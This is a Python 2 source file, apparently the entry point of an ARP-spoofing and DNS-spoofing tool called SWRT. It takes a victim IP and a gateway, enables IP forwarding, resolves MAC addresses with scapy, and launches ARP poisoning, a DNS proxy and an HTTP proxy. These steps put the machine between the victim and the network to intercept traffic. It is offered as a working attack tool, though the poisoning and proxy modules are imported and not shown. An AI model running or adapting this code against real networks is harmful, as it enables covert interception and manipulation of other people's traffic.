#!/usr/bin/env python2.7

import os
import sys
import fcntl
import struct
import traceback
import threading
import DNSConf
from time import sleep
import argparse
from scapy.all import *
from ArpPoisoner import ArpPoisoner
from DnsProxy import DnsProxy
from Proxy import Proxy

BLUE = '\033[94m'
END = '\033[0m'

class SWRT(object):
	def __init__(self):
		args = 0
		parser = argparse.ArgumentParser()
		parser.add_argument("-d", "--debug", help="increase output verbosity", action="store_true", required=False)
		parser.add_argument('-i', action='store', default="ens33", dest='interface', help='Store the interface', required=False)
		parser.add_argument('-t', action='store', dest='target', help='Store a target IP address', required=True)
		parser.add_argument('-r', action='store', default="192.168.1.1", dest='gateway', help='Store the gateway IP address', required=False)
		parser.add_argument('-c', action='store', dest='conf', default='./conf.json', help='Store path/to/conf.json', required=False)
		parser.add_argument('-p', action='store', default=8080, dest='port', help='Store the port', required=False)
		self.args = parser.parse_args()
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

		def get_host_ip(interface):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	
				return socket.inet_ntoa(fcntl.ioctl(
						s.fileno(),
						0x8915,
						struct.pack('256s', interface[:15])
						)[20:24])
			except IOError:
				print("Error: wrong interface.")
				exit(0)
		
		def get_host_mac(interface):
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', interface[:15]))
			return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]	
		
		def resolve_mac(ip):
			try:
				ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=ip), timeout=2, verbose = 0)
				for snd, rcv in ans:
					return str(rcv[Ether].src)
			except socket.gaierror:
				print "[!] WRONG TARGET / GATEWAY IP"
				exit(0)

		self.args.host_ip = get_host_ip(self.args.interface)
		self.args.host_mac = get_host_mac(self.args.interface)
		self.args.target_ip = self.args.target
		
		self.args.target_mac = resolve_mac(self.args.target_ip)
		self.args.gateway_ip = self.args.gateway
		self.args.gateway_mac = resolve_mac(self.args.gateway_ip)
		print "\033[95m*********************************************************"
		print "*\tMY IP: {} ({})\t*".format(self.args.host_ip, self.args.host_mac)		
		print "*\t\033[1mVICTIM IP {} ({})\t*".format(self.args.target_ip, self.args.target_mac)
		print "*\tGATEWAY IP {} ({})\t*".format(self.args.gateway_ip, self.args.gateway_mac)
		print "*********************************************************\033[0m"
	def setup(self, conf):
  		print ("lol")

if __name__ == "__main__":
	if os.geteuid() != 0:
		sys.exit("Need root privileges to run properly; Re-run as sudo...")
	swrt = SWRT()
	if (swrt.args.conf != None):
		config = DNSConf.DNSConf(swrt.args.interface, swrt.args.conf)		
	
	proxy = Proxy(swrt.args, config)
	dnsproxy = DnsProxy(config, swrt.args)
	try:
		ArpPoisoner(swrt.args)
		dnsproxy.go()
		proxy.go()
		
	except KeyboardInterrupt:
		proxy.stop()
		exit(1)
	except Exception as e:
		proxy.stop()
		exc_type, exc_value, exc_traceback = sys.exc_info()
		traceback.print_tb(exc_traceback, limit=1, file=sys.stdout)
		traceback.print_exception(exc_type, exc_value, exc_traceback,
	                              limit=2, file=sys.stdout)
		traceback.print_exc()
		formatted_lines = traceback.format_exc().splitlines()
		print formatted_lines[0]
		print formatted_lines[-1]
		print repr(traceback.format_exception(exc_type, exc_value,
	                                          exc_traceback))
		print repr(traceback.extract_tb(exc_traceback))
		print repr(traceback.format_tb(exc_traceback))
		exit(1)